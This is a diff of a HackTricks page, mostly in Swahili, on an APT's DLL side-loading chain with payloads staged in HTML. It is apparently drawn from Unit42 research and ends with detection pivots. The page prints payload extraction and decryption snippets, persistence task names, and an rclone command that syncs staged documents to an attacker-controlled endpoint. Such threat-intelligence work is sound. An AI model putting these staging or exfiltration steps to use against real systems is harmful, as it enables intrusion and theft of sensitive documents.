@@ -1,22 +1,22 @@
-# Advanced DLL Side-Loading With HTML-Embedded Payload Staging
+# DLL Side-Loading ya Juu na HTML-Embedded Payload Staging
 
 {{#include ../../../banners/hacktricks-training.md}}
 
-## Muhtasari wa Mbinu
+## Muhtasari wa Tradecraft
 
-Ashen Lepus (aka WIRTE) alitumia muundo unaorudiwa unaochaina DLL sideloading, staged HTML payloads, na modular .NET backdoors ili kudumu ndani ya mitandao ya ubalozi ya Mashariki ya Kati. Mbinu hii inaweza kutumika tena na opereta yeyote kwa sababu inategemea:
+Ashen Lepus (aka WIRTE) alitumia namna inayoweza kurudiwa inayounganisha DLL sideloading, staged HTML payloads, na modular .NET backdoors ili kudumu ndani ya mitandao ya kidiplomasia ya Mashariki ya Kati. Mbinu hii inaweza kutumika tena na mdhibiti yeyote kwa sababu inategemea:
 
-- **Archive-based social engineering**: PDF zisizo hatari zinaelekeza walengwa kuvuta archive ya RAR kutoka tovuti ya kushiriki faili. Archive inajumuisha EXE ya msomaji wa nyaraka inayoonekana halali, DLL mbaya iliyojina kama maktaba ya kuaminika (e.g., `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), na `Document.pdf` ya kujiingiza.
-- **DLL search order abuse**: mteja anabonyeza mara mbili EXE, Windows inatafuta import ya DLL kutoka saraka ya sasa, na loader mbaya (AshenLoader) inatekelezwa ndani ya mchakato uliothibitishwa huku PDF ya kujiingiza ikifunguka ili kuepuka mashaka.
-- **Living-off-the-land staging**: kila hatua inayofuata (AshenStager → AshenOrchestrator → modules) haiko kwenye diski hadi itakapohitajika, hutumwa kama blobs zilizofichwa zilizosasishwa na encryption ndani ya majibu ya HTML yasiyo hatari.
+- **Archive-based social engineering**: PDF zisizo hatari zinawaelekeza walengwa kuvuta RAR archive kutoka kwenye tovuti ya kushirikisha faili. archive linabeba viewer EXE linaloonekana halali, DLL hatarishi iliyopangwa jina la maktaba ya kuaminika (mfano `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), na `Document.pdf` ya kumdanganya.
+- **DLL search order abuse**: mshambuliaji bonyeza mara mbili EXE, Windows inarekebisha import ya DLL kutoka saraka ya sasa, na loader hatarishi (AshenLoader) hufanya kazi ndani ya mchakato wa kuaminika wakati PDF ya kuonesha inafunguka ili kuepuka mashaka.
+- **Living-off-the-land staging**: kila hatua ya baadaye (AshenStager → AshenOrchestrator → modules) huhifadhiwa sio kwenye diski mpaka itakapohitajika, ikiletwa kama blobs zilizosimbwa zilizofichwa ndani ya majibu ya HTML yasiyotokea hatari.
 
-## Multi-Stage Side-Loading Chain
+## Mnyororo wa Ngazi-Ngazi wa Side-Loading
 
-1. **Decoy EXE → AshenLoader**: EXE inafanya side-load AshenLoader, ambayo hufanya recon ya mwenyeji, inaiweka kwa AES-CTR, na inai-POST ndani ya parameter zinazorota kama `token=`, `id=`, `q=`, au `auth=` kwenye njia zinazoonekana kama API (mfano `/api/v2/account`).
-2. **HTML extraction**: C2 hutangaza tu hatua inayofuata wakati IP ya mteja inapotofautishwa hadi mkoa lengwa na `User-Agent` inavyolingana na implant, ikikusudia kuwakataliwa sandboxes. Wakati ukaguzi unapopita, mwili wa HTTP una `<headerp>...</headerp>` blob yenye payload ya AshenStager iliyosimbwa kwa Base64/AES-CTR.
-3. **Second sideload**: AshenStager inaendeshwa pamoja na binary halali nyingine inayoinport `wtsapi32.dll`. Nakala mbaya iliyochanganywa ndani ya binary inachukua HTML zaidi, wakati huu ikikamua `<article>...</article>` ili kupata AshenOrchestrator.
-4. **AshenOrchestrator**: controller modular wa .NET anayefasiri config ya JSON iliyofungwa kwa Base64. Vectors za config `tg` na `au` zinachanganishwa/kuwekwa hash kuwa key ya AES, ambayo inaunda ufunguo wa kusambaza `xrk`. Bytes zinazotokana hutumika kama key ya XOR kwa kila blob ya module inayopatikana baadaye.
-5. **Module delivery**: kila module inaelezewa kupitia maoni ya HTML ambayo yanamwandisha parser kwa tag yoyote ile, kuvunja sheria za static zinazotafuta tu `<headerp>` au `<article>`. Modules ni pamoja na persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), na file exploration (`FE`).
+1. **Decoy EXE → AshenLoader**: EXE inafanya side-load ya AshenLoader, ambayo inafanya recon ya mwenyeji, inaisimbua kwa AES-CTR, na kuifanya POST ndani ya parameta zinazobadilika kama `token=`, `id=`, `q=`, au `auth=` kwa njia zinazoonekana kama API (mfano `/api/v2/account`).
+2. **HTML extraction**: C2 hutoa tu hatua inayofuata wakati tu IP ya mteja ina geolocate kwa eneo lengwa na `User-Agent` inafanana na implant, ikileta frustrate kwa sandboxes. Wakati ukaguzi unapita, mwili wa HTTP una `<headerp>...</headerp>` blob yenye AshenStager payload iliyosimbwa Base64/AES-CTR.
+3. **Second sideload**: AshenStager inawekwa kwa binary nyingine halali ambayo inimport `wtsapi32.dll`. Nakala hatarishi iliyosukumwa ndani ya binary inachukua HTML zaidi, wakati huu ikichonga `<article>...</article>` kurejesha AshenOrchestrator.
+4. **AshenOrchestrator**: controller modular .NET inayotafsiri config ya JSON iliyokuwa Base64. Sehemu za config `tg` na `au` zinaunganishwa/kuwekwa hash kuwa AES key, ambayo huidet decrypt `xrk`. Bytes zinazopatikana hutumika kama XOR key kwa kila module blob inayopatikana baadaye.
+5. **Module delivery**: kila module inaelezewa kupitia maoni ya HTML yanayomwelekeza parser kwa tag yoyote ile, kuvunja kanuni za static zinazotafuta tu `<headerp>` au `<article>`. Modules ni pamoja na persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), na file exploration (`FE`).
 
 ### HTML Container Parsing Pattern
 ```csharp
@@ -26,44 +26,61 @@ var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
 var module = XorBytes(aesBytes, xorKey);
 LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
 ```
-Hata kama watetezi watazuia au kuondoa kipengele fulani, msimamizi anahitaji tu kubadilisha tag iliyotajwa katika maoni ya HTML ili kuendeleza utoaji.
+Hata kama walinzi wanazuia au kuondoa kipengele maalum, mtendaji anahitaji tu kubadilisha tag iliyotajwa katika maoni ya HTML ili kuendelea na utoaji.
+
+### Msaidizi wa Utoaji wa Haraka (Python)
+```python
+import base64, re, requests
+
+html = requests.get(url, headers={"User-Agent": ua}).text
+tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
+b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
+blob = base64.b64decode(b64)
+# decrypt blob with AES-CTR, then XOR if required
+```
+## Mwingiliano ya HTML Staging Evasion
+
+Utafiti wa hivi karibuni wa HTML smuggling (Talos) unaonyesha payloads zilizofichwa kama Base64 strings ndani ya `<script>` blocks katika HTML attachments na kuziweka decoded kwa JavaScript wakati wa runtime. Njia ile ile inaweza kutumika kwa majibu ya C2: stage encrypted blobs ndani ya script tag (au element nyingine ya DOM) na kuzitafsiri kwa in-memory kabla ya AES/XOR, ikifanya ukurasa uonekane kama HTML ya kawaida.
 
 ## Crypto & C2 Hardening
 
-- **AES-CTR everywhere**: loaders za sasa zinaweka funguo za 256-bit pamoja na nonces (mfano `{9a 20 51 98 ...}`) na kwa hiari zinaongeza tabaka la XOR kwa kutumia strings kama `msasn1.dll` kabla/baada ya decryption.
-- **Recon smuggling**: data iliyoorodheshwa sasa inajumuisha listings za Program Files kutambua apps zenye thamani kubwa na daima imeencrypted kabla ya kuondoka kwenye host.
-- **URI churn**: query parameters na REST paths zinazunguka kati ya campaigns (`/api/v1/account?token=` → `/api/v2/account?auth=`), zikiharibu detections dhaifu.
-- **Gated delivery**: servers zimegeo-fenced na zinajibu implants halisi pekee. Clients wasioruhusiwa hupokea HTML isiyo ya kushtukiza.
+- **AES-CTR everywhere**: current loaders embed 256-bit keys plus nonces (e.g., `{9a 20 51 98 ...}`) and optionally add an XOR layer using strings such as `msasn1.dll` before/after decryption.
+- **Infrastructure split + subdomain camouflage**: staging servers are separated per tool, hosted across varying ASNs, and sometimes fronted by legitimate-looking subdomains, so burning one stage doesn't expose the rest.
+- **Recon smuggling**: enumerated data now includes Program Files listings to spot high-value apps and is always encrypted before it leaves the host.
+- **URI churn**: query parameters and REST paths rotate between campaigns (`/api/v1/account?token=` → `/api/v2/account?auth=`), invalidating brittle detections.
+- **Gated delivery**: servers are geo-fenced and only answer real implants. Unapproved clients receive unsuspicious HTML.
 
 ## Persistence & Execution Loop
 
-AshenStager hunyunyizia scheduled tasks zinazojifanya kazi za matengenezo ya Windows na zinafanywa kupitia `svchost.exe`, kwa mfano:
+AshenStager drops scheduled tasks that masquerade as Windows maintenance jobs and execute via `svchost.exe`, e.g.:
 
 - `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
 - `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
 - `C:\Windows\System32\Tasks\Automatic Windows Update`
 
-Kazi hizi zinarudisha kuanzishwa kwa mnyororo wa sideloading wakati wa boot au kwa vipindi, kuhakikisha AshenOrchestrator inaweza kuomba modules mpya bila kugusa disk tena.
+These tasks relaunch the sideloading chain on boot or at intervals, ensuring AshenOrchestrator can request fresh modules without touching disk again.
 
-## Using Benign Sync Clients for Exfiltration
+## Kutumia Benign Sync Clients kwa Exfiltration
 
-Wadhibiti huweka nyaraka za kidiplomasia ndani ya `C:\Users\Public` (zinazosomwa na wengi na zisizo za kushtuka) kupitia module maalumu, kisha hupakua binary halali ya [Rclone](https://rclone.org/) ili kusawazisha saraka hiyo na hifadhi inayodhibitiwa na mwadui:
+Operators stage diplomatic documents inside `C:\Users\Public` (world-readable and non-suspicious) through a dedicated module, then download the legitimate [Rclone](https://rclone.org/) binary to synchronize that directory with attacker storage. Unit42 notes this is the first time this actor has been observed using Rclone for exfiltration, aligning with the broader trend of abusing legitimate sync tooling to blend into normal traffic:
 
-1. **Stage**: nakili/ikusanye faili za lengo ndani ya `C:\Users\Public\{campaign}\`.
-2. **Configure**: tuma usanidi wa Rclone unaoonyesha kwenye endpoint ya HTTPS inayodhibitiwa na mwadui (mfano `api.technology-system[.]com`).
-3. **Sync**: endesha `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` ili trafiki ionekane kama backups za kawaida za cloud.
+1. **Stage**: copy/collect target files into `C:\Users\Public\{campaign}\`.
+2. **Configure**: ship an Rclone config pointing at an attacker-controlled HTTPS endpoint (e.g., `api.technology-system[.]com`).
+3. **Sync**: run `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` so the traffic resembles normal cloud backups.
 
-Kwa kuwa Rclone inatumika sana kwa workflows za halali za backup, watetezi wanapaswa kuzingatia utekelezaji usio wa kawaida (binaries mpya, remotes zisizo za kawaida, au kusawazisha ghafla `C:\Users\Public`).
+Kwa kuwa Rclone inatumiwa sana kwa workflows za backup halali, defenders wanapaswa kuzingatia executions zisizo za kawaida (new binaries, odd remotes, au syncing ghafla ya `C:\Users\Public`).
 
 ## Detection Pivots
 
-- Alert kuhusu **signed processes** ambazo ghafla zinapakia DLLs kutoka njia zinazoweza kuandikwa na watumiaji (Procmon filters + `Get-ProcessMitigation -Module`), hasa wakati majina ya DLL yanashirikiana na `netutils`, `srvcli`, `dwampi`, au `wtsapi32`.
-- Chunguza majibu ya HTTPS yenye shaka kwa **large Base64 blobs embedded inside unusual tags** au zilizo na ulinzi wa maoni `<!-- TAG: <xyz> -->`.
-- Tafuta **scheduled tasks** zinazomfanya `svchost.exe` kuendeshwa na arguments zisizo za service au zinazorejea kwenye directories za dropper.
-- Fuata **Rclone** binaries zinazoibuka nje ya maeneo yanayosimamiwa na IT, faili mpya za `rclone.conf`, au sync jobs zinazoleta kutoka saraka za staging kama `C:\Users\Public`.
+- Alert on **signed processes** that unexpectedly load DLLs from user-writable paths (Procmon filters + `Get-ProcessMitigation -Module`), especially when the DLL names overlap with `netutils`, `srvcli`, `dwampi`, or `wtsapi32`.
+- Inspect suspicious HTTPS responses for **large Base64 blobs embedded inside unusual tags** or guarded by `<!-- TAG: <xyz> -->` comments.
+- Extend HTML hunting to **Base64 strings inside `<script>` blocks** (HTML smuggling-style staging) that are decoded via JavaScript before AES/XOR processing.
+- Hunt for **scheduled tasks** that run `svchost.exe` with non-service arguments or point back to dropper directories.
+- Monitor for **Rclone** binaries appearing outside IT-managed locations, new `rclone.conf` files, or sync jobs pulling from staging directories like `C:\Users\Public`.
 
 ## References
 
 - [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
+- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)
 
 {{#include ../../../banners/hacktricks-training.md}}
